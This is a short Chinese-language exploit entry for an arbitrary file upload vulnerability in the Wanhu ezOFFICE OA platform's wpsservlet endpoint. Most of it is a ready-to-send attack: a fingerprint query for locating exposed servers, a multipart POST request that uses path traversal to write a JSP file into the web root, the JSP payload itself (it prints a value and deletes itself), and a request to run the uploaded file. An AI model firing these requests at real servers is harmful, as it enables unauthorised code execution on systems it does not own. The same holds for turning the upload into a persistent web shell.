# 万户协同办公平台wpsservlet存在任意文件上传漏洞

- **系统**：万户协同办公平台　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="万户 Ezoffice OA"`
- **请求**：`POST /defaultroot/wpsservlet?option=saveNewFile&newdocId=AOr6V&dir=../platform/portal/layout/&fileType=.jsp HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Content-Length: 207`　`Content-Type: multipart/form-data; boundary=pgT9AsKpmc`

**请求体 / payload**
```
--pgT9AsKpmc
Content-Disposition: form-data; name="NewFile"; filename="AOr6V.jsp"
<% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
--pgT9AsKpmc--

上传文件位置
GET /defaultroot/platform/portal/layout/AOr6V.jsp HTTP/1.1
Host: {hostname}
Cookie: OASESSIONID=47979EE3BFECCB9F41527871FBBE4789
```

**其他**
- 万户协同办公平台wpsservlet存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 万户ezoffice